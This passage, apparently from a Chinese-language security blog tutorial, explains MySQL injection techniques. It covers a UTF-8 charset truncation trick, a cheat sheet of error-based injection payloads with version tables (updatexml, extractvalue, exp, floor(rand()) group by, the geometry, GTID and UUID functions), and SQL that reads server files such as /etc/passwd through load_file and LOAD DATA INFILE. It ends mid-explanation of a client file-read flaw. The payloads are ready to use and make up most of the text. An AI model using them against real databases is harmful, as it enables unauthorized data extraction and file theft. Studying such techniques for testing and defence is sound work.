> 所以最终，UTF-8第一字节的取值范围是：00-7F、C2-F4。
>
> 关于所有的UTF-8字符，你可以在这个表中一一看到： 
>
> 引自：[Mysql字符编码利用技巧](https://www.leavesongs.com/PENETRATION/mysql-charset-> trick.html)
利用这一特性，我们输入：`?username=admin%c2`，`%c2`是一个Latin1字符集不存在的字符。
由上述，可以简单的知道：%00-%7F可以直接表示某个字符、%C2-%F4不可以直接表示某个字符，他们只是其他长字节编码结果的首字节。
但是，这里还有一个Trick：Mysql所使用的UTF-8编码是阉割版的，仅支持三个字节的编码。所以说，Mysql中的UTF-8字符集只有最大三字节的字符，首字节范围：`00-7F、C2-EF`。
而对于不完整的长字节UTF-8编码的字符，若进行字符集转换时，会直接进行忽略处理。
利用这一特性，我们的payload为`?username=admin%c2`，此处的`%c2`换为`%c2-%ef`均可。
    SELECT * FROM `table1` WHERE username='admin'
因为`admin%c2`在最后一层的内部操作字符集转换中变成`admin`。
## 报错注入原理
我们前边说到，报错注入是通过特殊函数错误使用并使其输出错误结果来获取信息的。
那么，我们具体来说说，都有哪些特殊函数，以及他们都该怎么使用。
MySQL的报错注入主要是利用MySQL的一些逻辑漏洞，如BigInt大数溢出等，由此可以将MySQL报错注入分为以下几类：
  * BigInt等数据类型溢出
  * 函数参数格式错误
  * 主键/字段重复
### exp()
函数语法：`exp(int)`
适用版本：5.5.5~5.5.49
该函数将会返回e的x次方结果。正常如下图：
为什么会报错呢？我们知道，次方到后边每增加1，其结果都将跨度极大，而mysql能记录的double数值范围有限，一旦结果超过范围，则该函数报错。如下图：
我们的payload为：`exp(~(select * from(select user())a))`
其中，~符号为运算符，意思为一元字符反转，通常将字符串经过处理后变成大整数，再放到exp函数内，得到的结果将超过mysql的double数组范围，从而报错输出。至于为什么需要用两层子查询，这点我暂时还没有弄明白，欢迎有了解的大牛找我讨论:
)
除了`exp()`之外，还有类似`pow()`之类的相似函数同样是可利用的，他们的原理相同。
### updatexml()
函数语法：`updatexml(XML_document, XPath_string, new_value);`
适用版本: 5.1.5+
我们通常在第二个xpath参数填写我们要查询的内容。
与exp()不同，updatexml是由于参数的格式不正确而产生的错误，同样也会返回参数的信息。
payload: `updatexml(1,concat(0x7e,(select user()),0x7e),1)`
前后添加~使其不符合xpath格式从而报错。
### extractvalue()
函数语法：`EXTRACTVALUE (XML_document, XPath_string);`
适用版本：5.1.5+
利用原理与updatexml函数相同
payload: `and (extractvalue(1,concat(0x7e,(select user()),0x7e)))`
### rand()+group()+count()
虚拟表报错原理：简单来说，是由于where条件每执行一次，rand函数就会执行一次，如果在由于在统计数据时判断依据不能动态改变，故`rand()`不能后接在`order/group
by`上。
举一个例子：假设user表有三条数据，我们通过：`select * from user group by username`
来通过其中的username字段进行分组。
此过程会先建立一个 **虚拟表** ，存在两个字段：`key，count`
其中我们通过username来判断，其在此处是字段，首先先取第一行的数据：`username=test&password=test`
username为test出现一次，则现在虚表内查询是否存在test，若存在，则count+1，若不存在，则添加test，其count为1。
对于`floor(rand(0)*2)`，其中`rand()`函数，会生成0~1之间随机一个小数、`floor()`取整数部分、0是随机因子、乘2是为了让大于0.5的小数通过floor函数得1，否则永远为0。
若表中有三行数据：我们通过`select * from user group by floor(rand(0)*2)`进行排序的话。
注意，由于`rand(0)`的随机因子是被固定的，故其产生的随机数也被固定了，顺序为：011011…
首先`group
by`需要执行的话，需要确定分组因子，故`floor(rand(0)*2)`被执行一次，得到的结果为0，接着在虚表内检索0，发现虚表没有键值为0的记录，故添加上，在进行添加时：`floor(rand(0)*2)`第二次被执行，得到结果1，故虚表插入的内容为`key=1&count=1`。
第二次执行group
by时：`floor(rand(0)*2)`先被运行一次，也就是第三次运行。得到结果1，查询虚表发现数据存在，因而直接让虚表内的key=1的count加一即可，floor(..)只运行了一次。
第三次执行group
by时，floor被执行第四次，得到结果0，查询虚表不存在。再插入虚表时，floor(…)被执行第五次，得到结果1，故此时虚表将插入的值为`key=1&count=1`，注意，此时虚表已有一条记录为：`key=1&count=2`，并且字段key为
**主键** ，具有不可重复性，故虚表在尝试插入时将产生错误。
图文：
> 1.查询前默认会建立空虚拟表如下图:
>
>
> 
>
> 2.取第一条记录，执行floor(rand(0) _2)，发现结果为0(第一次计算),查询虚拟表，发现0的键值不存在，则floor(rand(0)_
> 2)会被再计算一次，结果为1(第二次计算)，插入虚表，这时第一条记录查询完毕，如下图:
>
>
> 
>
> \3.查询第二条记录，再次计算floor(rand(0)
> _2)，发现结果为1(第三次计算)，查询虚表，发现1的键值存在，所以floor(rand(0)_
> 2)不会被计算第二次，直接count(*)加1，第二条记录查询完毕，结果如下:
>
>
> 
>
> 4.查询第三条记录，再次计算floor(rand(0)
> _2)，发现结果为0(第4次计算)，查询虚表，发现键值没有0，则数据库尝试插入一条新的数据，在插入数据时floor(rand(0)_
> 2)被再次计算，作为虚表的主键，其值为1(第5次计算)，然而1这个主键已经存在于虚拟表中，而新计算的值也为1(主键键值必须唯一)，所以插入的时候就直接报错了。
>
> 5.整个查询过程floor(rand(0)*2)被计算了5次，查询原数据表3次，所以这就是为什么数据表中需要3条数据，使用该语句才会报错的原因。
>
> 引自：——[Mysql报错注入原理分析(count()、rand()、group
> by)](http://drops.wooyun.org/tips/14312)
payload用法: `union select count(*),2,concat(':',(select
database()),':',floor(rand()*2))as a from information_schema.tables group by
a`
### 几何函数
  * GeometryCollection：`id=1 AND GeometryCollection((select * from (select* from(select user())a)b))`
  * polygon()：`id=1 AND polygon((select * from(select * from(select user())a)b))`
  * multipoint()：`id=1 AND multipoint((select * from(select * from(select user())a)b))`
  * multilinestring()：`id=1 AND multilinestring((select * from(select * from(select user())a)b))`
  * linestring()：`id=1 AND LINESTRING((select * from(select * from(select user())a)b))`
  * multipolygon() ：`id=1 AND multipolygon((select * from(select * from(select user())a)b))`
### 不存在的函数
随便适用一颗不存在的函数，可能会得到当前所在的数据库名称。
### Bigint数值操作：
当mysql数据库的某些边界数值进行数值运算时，会报错的原理。
如~0得到的结果：18446744073709551615
若此数参与运算，则很容易会错误。
payload: `select !(select * from(select user())a)-~0;`
### name_const()
仅可取数据库版本信息
payload: `select * from(select
name_const(version(),0x1),name_const(version(),0x1))a`
### uuid相关函数
适用版本：8.0.x
参数格式不正确。
    mysql> SELECT UUID_TO_BIN((SELECT password FROM users WHERE id=1));
    mysql> SELECT BIN_TO_UUID((SELECT password FROM users WHERE id=1));
### join using()注列名
通过系统关键词join可建立两个表之间的内连接。
通过对想要查询列名的表与其自身建议内连接，会由于冗余的原因(相同列名存在)，而发生错误。
并且报错信息会存在重复的列名，可以使用 **USING** 表达式声明内连接（INNER JOIN）条件来避免报错。
    mysql>select * from(select * from users a join (select * from users)b)c;
    mysql>select * from(select * from users a join (select * from users)b using(username))c;
    mysql>select * from(select * from users a join (select * from users)b using(username,password))c
### GTID相关函数
参数格式不正确。
    mysql>select gtid_subset(user(),1);
    mysql>select gtid_subset(hex(substr((select * from users limit 1,1),1,1)),1);
    mysql>select gtid_subtract((select * from(select user())a),1);
### 报错函数速查表
注：默认MYSQL_ERRMSG_SIZE=512
类别 | 函数 | 版本需求 | 5.5.x | 5.6.x | 5.7.x | 8.x | 函数显错长度 | Mysql报错内容长度 | 额外限制  
---|---|---|---|---|---|---|---|---|---  
主键重复 | floor round | ❓ | ✔️ | ✔️ | ✔️ |  | 64 |  | data_type ≠ varchar  
列名重复 | name_const | ❓ | ✔️ | ✔️ | ✔️ | ✔️ |  |  | only version()  
列名重复 | join | [5.5.49, ?) | ✔️ | ✔️ | ✔️ | ✔️ |  |  | only columns  
数据溢出 - Double | 1e308 cot exp pow | [5.5.5, 5.5.48] | ✔️ |  |  |  |  |
MYSQL_ERRMSG_SIZE |  
数据溢出 - BIGINT | 1+~0 | [5.5.5, 5.5.48] | ✔️ |  |  |  |  | MYSQL_ERRMSG_SIZE |  
几何对象 | geometrycollection linestring multipoint multipolygon multilinestring
polygon | [?, 5.5.48] | ✔️ |  |  |  |  | 244 |  
空间函数 Geohash | ST_LatFromGeoHash ST_LongFromGeoHash ST_PointFromGeoHash |
[5.7, ?) |  |  | ✔️ | ✔️ | 128 |  |  
GTID | gtid_subset gtid_subtract | [5.6.5, ?) |  | ✔️ | ✔️ | ✔️ | 200 |  |  
JSON | json_* | [5.7.8, 5.7.11] |  |  | ✔️ |  | 200 |  |  
UUID | uuid_to_bin bin_to_uuid | [8.0, ?) |  |  |  | ✔️ | 128 |  |  
XPath | extractvalue updatexml | [5.1.5, ?) | ✔️ | ✔️ | ✔️ | ✔️ | 32 |  
> 摘自——[Mysql 注入基础小结](https://blog.sari3l.com/posts/9622f295/)
## 文件读/写
我们知道Mysql是很灵活的，它支持文件读/写功能。在讲这之前，有必要介绍下什么是`file_priv`和`secure-file-priv`。
简单的说：`file_priv`是对于用户的文件读写权限，若无权限则不能进行文件读写操作，可通过下述payload查询权限。
    select file_priv from mysql.user where user=$USER host=$HOST;
`secure-file-priv`是一个系统变量，对于文件读/写功能进行限制。具体如下：
  * 无内容，表示无限制。
  * 为NULL，表示禁止文件读/写。
  * 为目录名，表示仅允许对特定目录的文件进行读/写。
注： **5.5.53本身及之后的版本默认值为NULL，之前的版本无内容** 。
三种方法查看当前`secure-file-priv`的值：
    select @@secure_file_priv;
    select @@global.secure_file_priv;
    show variables like "secure_file_priv";
修改：
  * 通过修改my.ini文件，添加：`secure-file-priv=`
  * 启动项添加参数：`mysqld.exe --secure-file-priv=`
### 读
Mysql读取文件通常使用load_file函数，语法如下：
    select load_file(file_path);
第二种读文件的方法：
    load data infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n'; #读取服务端文件
第三种：
    load data local infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n'; #读取客户端文件
限制：
  * 前两种需要`secure-file-priv`无值或为有利目录。
  * 都需要知道要读取的文件所在的绝对路径。
  * 要读取的文件大小必须小于`max_allowed_packet`所设置的值
#### 低权限读取文件
5.5.53`secure-file-priv=NULL`读文件payload，mysql8测试失败，其他版本自测。
    drop table mysql.m1;
    CREATE TABLE mysql.m1 (code TEXT );
    LOAD DATA LOCAL INFILE 'D://1.txt' INTO TABLE mysql.m1 fields terminated by '';
    select * from mysql.m1;
#### Mysql连接数据库时可读取文件
这个漏洞是mysql的一个特性产生的，是上述的第三种读文件的方法为基础的。
简单描述该漏洞：Mysql客户端在执行`load data
local`语句的时，先想mysql服务端发送请求，服务端接收到请求，并返回需要读取的文件地址，客户端接收该地址并进行读取，接着将读取到的内容发送给服务端。用通俗的语言可以描述如下：
> 原本的查询流程为
>  
>  
>     客户端：我要把我的win.ini文件内容插入test表中
>     服务端：好，我要你的win.ini文件内容
>     客户端：win.ini的内容如下....
>